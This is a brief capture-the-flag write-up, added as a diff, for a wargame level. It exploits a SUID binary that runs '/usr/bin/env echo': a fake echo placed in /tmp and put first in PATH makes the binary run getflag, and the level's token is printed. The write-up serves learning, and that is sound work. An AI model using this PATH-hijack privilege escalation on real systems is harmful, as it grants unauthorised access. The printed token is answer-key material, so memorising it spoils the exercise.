@@ -1,0 +1,32 @@
+ls -la
+ -rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
+
+the s in permissions stand for SUID and SGID (Set User/Group ID), meaning the program will be run with the permissions of the file's owner
+
+./level03 
+ Exploit me
+
+./level03 test 
+ Exploit me
+
+strings level03
+ [...]
+ __libc_start_main
+ GLIBC_2.0
+ PTRh
+ UWVS
+ [^_]
+ /usr/bin/env echo Exploit me <== THERE
+ ;*2$"
+ GCC: (Ubuntu/Linaro 4.6.3-1ubuntu5) 4.6.3
+ [...]
+
+it seems to always run the command "echo Exploit me"
+
+we can write our own echo version in /tmp and add it to the path for it to be run instead :
+
+echo getflag > /tmp/echo
+chmod+x /tmp/echo
+export PATH=/tmp:$PATH
+./level03
+ Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
